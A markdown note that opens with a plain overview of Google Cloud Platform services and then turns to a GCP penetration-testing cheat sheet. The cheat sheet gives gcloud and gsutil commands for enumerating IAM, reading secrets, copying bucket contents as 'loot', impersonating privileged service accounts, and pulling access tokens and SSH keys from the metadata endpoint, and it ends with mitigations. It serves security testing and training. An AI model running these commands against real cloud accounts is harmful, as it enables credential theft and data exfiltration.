# What is GCP?
Google Cloud Platform (GCP) is a suite of cloud computing services provided by Google. It offers a variety of services for computing, storage, machine learning, networking, databases, and more. GCP enables businesses and individuals to leverage Google's infrastructure to build, deploy, and scale applications and services.

## Key Concepts

- Regions and Zones:

  - GCP is organized into regions, each containing multiple zones. Regions are geographic locations, and zones are isolated data centers within those regions. This structure enhances availability and reliability.
- Compute Services:

  - Compute Engine: Allows users to run virtual machines (VMs) in the cloud, similar to AWS EC2 and Azure VMs.
  - Google Kubernetes Engine (GKE): A managed Kubernetes service for orchestrating and deploying containerized applications.
- Storage Services:

  - Cloud Storage: Object storage service for storing and retrieving data, suitable for various use cases such as backups, data sharing, and multimedia storage.
  - Persistent Disk: Provides block storage that can be attached to Compute Engine instances.
- Database Services:

  - Cloud SQL: Fully managed relational database service, similar to AWS RDS and Azure SQL Database.
  - Firestore: A NoSQL document database for building web, mobile, and server applications.
- Networking:

  - Virtual Private Cloud (VPC): Allows you to create and manage your own isolated network in GCP, similar to AWS VPC and Azure VNet.
  - Load Balancing: Distributes incoming network traffic across multiple instances to ensure availability and reliability.
- Security:

  - Identity and Access Management (IAM): Allows you to manage access and permissions to GCP resources.
  - Security Command Center: Provides a unified view of security and data risk across your Google Cloud Platform resources.
- Management Tools:

  - Google Cloud Console: A web-based interface for managing and monitoring GCP resources.
  - Cloud SDK: Command-line tools for interacting with GCP services programmatically.
## Advantages of GCP

- Data Analytics and Machine Learning: GCP is known for its strong offerings in data analytics and machine learning services.
- Global Network Infrastructure: Google's extensive global network provides low-latency and high-performance connectivity.
- BigQuery: A serverless, highly scalable, and cost-effective multi-cloud data warehouse.

## Getting Started

- Sign up for a GCP account on the GCP website.
- Explore the free tier to experiment with various GCP services.
- GCP provides detailed documentation and tutorials to help you understand and use their services.

GCP, like AWS and Azure, offers a broad range of services. Starting with specific services based on your needs and gradually expanding your knowledge will help you make the most of Google Cloud Platform.

---

# GCP Penetration Testing

## Setup

```bash
# Install gcloud SDK, then authenticate
gcloud auth login
gcloud auth activate-service-account --key-file=key.json   # if you found a SA key

gcloud config list
gcloud projects list
gcloud config set project <project-id>
```

## Enumeration

```bash
# What can this identity do? (test permissions)
gcloud projects get-iam-policy <project-id>
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account <sa>@<project>.iam.gserviceaccount.com

# Compute, buckets, functions
gcloud compute instances list
gsutil ls                                   # list buckets
gsutil ls -r gs://target-bucket             # recurse
gsutil cp -r gs://target-bucket ./loot      # exfil
gcloud functions list

# Secrets
gcloud secrets list
gcloud secrets versions access latest --secret=<name>
```

## Common privilege-escalation paths

- **iam.serviceAccounts.getAccessToken** / **actAs** → impersonate a higher-priv SA:

```bash
gcloud auth print-access-token --impersonate-service-account=admin-sa@proj.iam.gserviceaccount.com
```

- **iam.serviceAccountKeys.create** → mint a persistent key for a privileged SA.
- **compute.instances.setMetadata** → add an SSH key or startup script to run as root.
- **Metadata SSRF** on a GCE instance → steal the SA token:

```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" -H "Metadata-Flavor: Google"
```

## Automated tooling

```bash
# GCPBucketBrute — find open/misnamed buckets
python3 gcpbucketbrute.py -k target

# Enumerate/exploit IAM privesc paths
gcp_scanner                     # Google's own SA-key scanner
prowler gcp
scout suite gcp
```

## Mitigation checklist

- Least-privilege IAM; avoid primitive roles (Owner/Editor); no SA key files—use Workload Identity.
- Restrict metadata access; disable legacy metadata endpoints.
- Uniform bucket-level access; block public buckets; enable VPC-SC.
- Enable Security Command Center + audit logs; alert on IAM changes.

## Related

- [Top Cloud Security Risks](Top%20Cloud%20Security%20Risks.md)
- [Kubernetes Security](../Containers/Kubernetes%20Security.md) (GKE)
